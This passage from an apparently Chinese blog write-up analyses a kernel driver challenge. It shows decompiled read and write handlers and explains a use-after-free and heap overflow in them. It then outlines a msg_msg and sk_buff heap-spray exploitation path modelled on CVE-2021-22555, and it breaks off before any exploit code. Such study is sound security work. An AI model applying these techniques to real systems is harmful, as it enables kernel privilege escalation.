__int32 v6; <span class="comment">// eax</span></span><br><span class="line">  __int64 v7; <span class="comment">// r13</span></span><br><span class="line">  __int64 idx; <span class="comment">// rax</span></span><br><span class="line">  __int64 offset; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 *v10; <span class="comment">// r8</span></span><br><span class="line">  __int64 read_size; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 remaining_size; <span class="comment">// rbx</span></span><br><span class="line">  __int64 read_chunk_pos; <span class="comment">// r15</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v16; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v17; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v18; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v19; <span class="comment">// eax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rbx</span></span><br><span class="line">  _WORD *chunk; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, user_buf);</span><br><span class="line">  a3 = v2;</span><br><span class="line">  v4 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v5 = v4 + <span class="number">40</span>;</span><br><span class="line">  raw_spin_lock(v4 + <span class="number">40</span>);</span><br><span class="line">  v6 = __indword(*(_QWORD *)(v4 + <span class="number">0x20</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    idx = *(<span class="keyword">int</span> *)(v7 + <span class="number">0xB0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)idx != *(_DWORD *)(v7 + <span class="number">0xB4</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      offset = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = *(<span class="keyword">unsigned</span> __int16 **)(v7 + <span class="number">8</span> * idx + <span class="number">0x30</span>);</span><br><span class="line">          read_size = v10[<span class="number">1</span>];</span><br><span class="line">          remaining_size = *v10 - (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read_size;</span><br><span class="line">          read_chunk_pos = (__int64)v10 + read_size + <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> ( remaining_size &gt; a3 )</span><br><span class="line">            remaining_size = a3;                <span class="comment">// current_read_size</span></span><br><span class="line">          <span class="keyword">if</span> ( (remaining_size &amp; <span class="number">0x80000000</span>) != <span class="number">0LL</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          chunk = *(_WORD **)(v7 + <span class="number">8</span> * idx + <span class="number">0x30</span>);</span><br><span class="line">          _check_object_size((<span class="keyword">char</span> *)v10 + read_size + <span class="number">4</span>, remaining_size, <span class="number">1LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( copy_to_user(offset + user_buf, read_chunk_pos, remaining_size) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          a3 -= remaining_size;</span><br><span class="line">          offset += remaining_size;</span><br><span class="line">          v14 = (<span class="keyword">unsigned</span> __int16)(remaining_size + chunk[<span class="number">1</span>]);</span><br><span class="line">          chunk[<span class="number">1</span>] += remaining_size;</span><br><span class="line">          <span class="keyword">if</span> ( (_WORD)v14 == *chunk )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (_WORD)v14 != <span class="number">0xFFC</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">            kfree(chunk);</span><br><span class="line">            *(_DWORD *)(v7 + <span class="number">0xB0</span>) = (*(_DWORD *)(v7 + <span class="number">0xB0</span>) + <span class="number">1</span>) % <span class="number">0x10</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( a3 )</span><br><span class="line">          &#123;</span><br><span class="line">            idx = *(<span class="keyword">int</span> *)(v7 + <span class="number">0xB0</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (_DWORD)idx != *(_DWORD *)(v7 + <span class="number">0xB4</span>) )</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(&amp;unk_F90);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_1038);</span><br><span class="line">LABEL_21:</span><br><span class="line">    raw_spin_unlock(v5);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v16 = <span class="number">0x200</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x200</span> )</span><br><span class="line">    v16 = a3;</span><br><span class="line">  v17 = *(_QWORD *)(v15 + <span class="number">0x20</span>);</span><br><span class="line">  v18 = __indword(v17);</span><br><span class="line">  <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v19 = __indword(v17 + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v19 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = *(_QWORD *)(v15 + <span class="number">0x18</span>);</span><br><span class="line">      _check_object_size(v20, v16, <span class="number">1LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( copy_to_user(user_buf, v20, v16) )</span><br><span class="line">        printk(&amp;unk_1010);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_FF0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  bytedev_read_cold_14();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在驱动的这个read函数中被分为了两块，在下半部分可以看到一直使用的是<code>__indword</code>函数，而这个是对于设备的IO操作，所以下半部分就是对于设备的控制，上半部分则是对于内核中自身的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">bytedev_write</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 a3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v5; <span class="comment">// eax</span></span><br><span class="line">  __int64 v6; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// r9d</span></span><br><span class="line">  <span class="keyword">int</span> read_idx; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  __int64 v10; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// edx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 remaining_size; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  _WORD *chunk; <span class="comment">// r13</span></span><br><span class="line">  __int64 user_buf; <span class="comment">// r12</span></span><br><span class="line">  __int64 write_offset; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// r13</span></span><br><span class="line">  _DWORD *v19; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v20; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v21; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v22; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v23; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v24; <span class="comment">// eax</span></span><br><span class="line">  __int64 v25; <span class="comment">// rbx</span></span><br><span class="line">  _WORD *v27; <span class="comment">// rax</span></span><br><span class="line">  _WORD *v28; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v30; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))_fentry__)();</span><br><span class="line">  a3 = v2;</span><br><span class="line">  v4 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v32 = v4 + <span class="number">0x28</span>;</span><br><span class="line">  raw_spin_lock(v4 + <span class="number">0x28</span>);</span><br><span class="line">  v5 = __indword(*(_QWORD *)(v4 + <span class="number">0x20</span>));</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = <span class="number">0x200</span>LL;</span><br><span class="line">      v21 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">      <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x200</span> )</span><br><span class="line">        v20 = a3;</span><br><span class="line">      v22 = *(_QWORD *)(v21 + <span class="number">0x20</span>);</span><br><span class="line">      v10 = v20;</span><br><span class="line">      v23 = __indword(v22);</span><br><span class="line">      <span class="keyword">if</span> ( v23 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v24 = __indword(v22 + <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v24 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v25 = *(_QWORD *)(v21 + <span class="number">0x18</span>);</span><br><span class="line">          _check_object_size(v25, v20, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( copy_from_user(v25, a2, v10) )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = <span class="number">-14LL</span>;</span><br><span class="line">            printk(&amp;unk_1090);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v10 = <span class="number">-14LL</span>;</span><br><span class="line">          printk(&amp;unk_FF0);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="number">-14LL</span>;</span><br><span class="line">        printk(&amp;unk_FC0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">-14LL</span>;</span><br><span class="line">      printk(&amp;unk_1038);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    idx = *(_DWORD *)(v6 + <span class="number">0xB4</span>);</span><br><span class="line">    read_idx = *(_DWORD *)(v6 + <span class="number">0xB0</span>);</span><br><span class="line">    v9 = idx + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (idx + <span class="number">1</span>) % <span class="number">16</span> != read_idx</span><br><span class="line">      || (v28 = *(_WORD **)(v6 + <span class="number">8LL</span> * idx + <span class="number">0x30</span>)) == <span class="number">0LL</span></span><br><span class="line">      || (v10 = <span class="number">-14LL</span>, *v28 &lt;= <span class="number">0xFFB</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v9 % <span class="number">16</span> == read_idx )</span><br><span class="line">          &#123;</span><br><span class="line">            v27 = *(_WORD **)(v6 + <span class="number">8LL</span> * idx + <span class="number">0x30</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v27 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( *v27 &gt; <span class="number">0xFFB</span>u )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          chunk = *(_WORD **)(v6 + <span class="number">8LL</span> * ((idx + <span class="number">0xF</span>) % <span class="number">16</span>) + <span class="number">0x30</span>);</span><br><span class="line">          user_buf = a2 + v10;</span><br><span class="line">          <span class="keyword">if</span> ( chunk &amp;&amp; (write_offset = (<span class="keyword">unsigned</span> __int16)*chunk, (_WORD)write_offset != <span class="number">0xFFC</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = (<span class="keyword">unsigned</span> __int16)write_offset;</span><br><span class="line">            v12 = (__int64)chunk + write_offset + <span class="number">4</span>;</span><br><span class="line">            remaining_size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">0xFFC</span> - v11);</span><br><span class="line">            <span class="keyword">if</span> ( remaining_size &gt; a3 )</span><br><span class="line">              remaining_size = a3;</span><br><span class="line">            <span class="keyword">if</span> ( (remaining_size &amp; <span class="number">0x80000000</span>) != <span class="number">0LL</span> )</span><br><span class="line">              BUG();</span><br><span class="line">            v30 = v12;</span><br><span class="line">            _check_object_size(v12, remaining_size, <span class="number">0LL</span>);</span><br><span class="line">            v14 = copy_from_user(v30, user_buf, remaining_size);</span><br><span class="line">            <span class="keyword">if</span> ( v14 )</span><br><span class="line">            &#123;</span><br><span class="line">              v10 = v14;</span><br><span class="line">              printk(&amp;unk_1060);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            *chunk += remaining_size;</span><br><span class="line">            a3 -= remaining_size;</span><br><span class="line">            v10 += remaining_size;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v31 = idx;</span><br><span class="line">            v18 = <span class="number">0xFFC</span>LL;</span><br><span class="line">            v19 = (_DWORD *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">26</span>], <span class="number">0x400CC0</span>LL, <span class="number">0x1000</span>LL);</span><br><span class="line">            *(_QWORD *)(v6 + <span class="number">8LL</span> * v31 + <span class="number">0x30</span>) = v19;</span><br><span class="line">            <span class="keyword">if</span> ( a3 &lt;= <span class="number">0xFFC</span> )</span><br><span class="line">              v18 = a3;</span><br><span class="line">            *(_DWORD *)(v6 + <span class="number">0xB4</span>) = (*(_DWORD *)(v6 + <span class="number">0xB4</span>) + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">            *v19 = <span class="number">0</span>;</span><br><span class="line">            _check_object_size(v19 + <span class="number">1</span>, v18, <span class="number">0LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( copy_from_user(v19 + <span class="number">1</span>, user_buf, v18) )</span><br><span class="line">              <span class="keyword">return</span> ((__int64 (*)(<span class="keyword">void</span>))bytedev_write_cold_15)();</span><br><span class="line">            a3 -= v18;</span><br><span class="line">            *(_WORD *)v19 += v18;</span><br><span class="line">            v10 += v18;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( !a3 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          idx = *(_DWORD *)(v6 + <span class="number">0xB4</span>);</span><br><span class="line">          read_idx = *(_DWORD *)(v6 + <span class="number">0xB0</span>);</span><br><span class="line">          v9 = idx + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  raw_spin_unlock(v32);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里write的做法跟read类似，依旧可以分为两个部分。通过我上面修改的变量名称其实也就可以很好的推断出来实际的结构了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ptr &#123;</span><br><span class="line"><span class="number">0xC8</span> : manager_object</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">manager_object &#123;</span><br><span class="line">(<span class="number">0x30</span> + idx * <span class="number">0x8</span>) : each_data</span><br><span class="line"><span class="number">0xB0</span> : read_idx</span><br><span class="line"><span class="number">0xB4</span> : write_idx</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">each_data &#123;</span><br><span class="line"><span class="number">0x0</span> : write_size</span><br><span class="line"><span class="number">0x2</span> : read_size</span><br><span class="line"><span class="number">0x4</span> — <span class="number">0xfff</span> : content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是类似于上述这样的结构。这里的漏洞主要发生于read中，可以看到在已经读取的size为<code>0xffc</code>时则会free掉响应的object但是，实际的指针并没有被清除，这样也就造成了UAF。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chunk = *(_WORD **)(v6 + <span class="number">8LL</span> * ((idx + <span class="number">0xF</span>) % <span class="number">16</span>) + <span class="number">0x30</span>);</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ( chunk &amp;&amp; (write_offset = (<span class="keyword">unsigned</span> __int16)*chunk, (_WORD)write_offset != <span class="number">0xFFC</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  *(_DWORD *)(v6 + <span class="number">0xB4</span>) = (*(_DWORD *)(v6 + <span class="number">0xB4</span>) + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且在write函数中虽然在第一次写入的时候会修改<code>write_idx</code>为1但是在第二次调用的时候会加上<code>0xf</code>随即和16取余，而这也就等价于对<code>write_idx</code>减一的操作，也就以为着我们仍然可以对刚创建的object进行使用。不过前提是还需要绕过这个if语句，当然绕过的方式也是十分简单，这里使用<code>sk_buff</code>进行堆喷即可并且如果<code>write_size</code>我们修改为比<code>0xffc</code>大的数字还可造成堆溢出。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>这里的利用方式依旧采用<a href="https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/">CVE-2021-22555</a>进行利用，不熟悉的朋友可以去查看我先前对这一利用方法的分析。</p><p>因为利用方法以往已经分析过了所以这里只对如何达到上述利用的条件做分析。</p><p>这里又一次不得不提到一个常用的结构体<code>msg_msg</code>了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后就是我们熟悉的关于<code>msg_msg</code>和<code>msg_queue</code>之间的结构为一个双向链表结构，并且结合linux源码可以看到寻找消息的过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">find_msg</span><span class="params">(struct msg_queue *msq, <span class="keyword">long</span> *msgtyp, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">found</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">long</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">list_for_each_entry(msg, &amp;msq-&gt;q_messages, m_list) &#123;</span><br><span class="line"><span class="keyword">if</span> (testmsg(msg, *msgtyp, mode) &amp;&amp;</span><br><span class="line">    !security_msg_queue_msgrcv(&amp;msq-&gt;q_perm, msg, current,</span><br><span class="line">       *msgtyp, mode)) &#123;</span><br><span class="line"><span class="keyword">if</span> (mode == SEARCH_LESSEQUAL &amp;&amp; msg-&gt;m_type != <span class="number">1</span>) &#123;</span><br><span class="line">*msgtyp = msg-&gt;m_type - <span class="number">1</span>;</span><br><span class="line">found = msg;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == SEARCH_NUMBER) &#123;</span><br><span class="line"><span class="keyword">if</span> (*msgtyp == count)</span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> found ?: ERR_PTR(-EAGAIN);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> list_for_each_entry(pos, head, member)\</span></span><br><span class="line"><span class="meta">for (pos = list_first_entry(head, typeof(*pos), member);\</span></span><br><span class="line"><span class="meta">     !list_entry_is_head(pos, head, member);\</span></span><br><span class="line"><span class="meta">     pos = list_next_entry(pos, member))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> list_first_entry(ptr, type, member) \</span></span><br><span class="line"><span class="meta">list_entry((ptr)-&gt;next, type, member)</span></span><br></pre></td></tr></table></figure><p><strong>可以发现使用next指针进行寻找的，那么根据在<code>vuln driver</code>中存在的漏洞就是堆溢出，所以理所当然的就能够想到通过堆溢出修改紧邻的<code>primary msg_msg</code>结构体的next指针指向随机一个<code>seconday msg_msg</code>即可造成两个指针指向通过一个object的情况。那么如果我们这时通过原本指向的<code>secondary msg_msg</code>的<code>primary msg_msg</code>的<code>msg_queue</code>进行索引去<code>msgrcv</code>的话即可释放掉<code>secondary msg_msg</code>，但是还存在一个被堆溢出修改的<code>primary msg_msg</code>的next指针依旧指向<code>secondary msg_msg</code>那么我们仍然可以通过被破坏的<code>primary msg_msg</code>去索引到已经被free掉的<code>secondary msg_msg</code>。这也就造成了我们所期盼的UAF了。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td 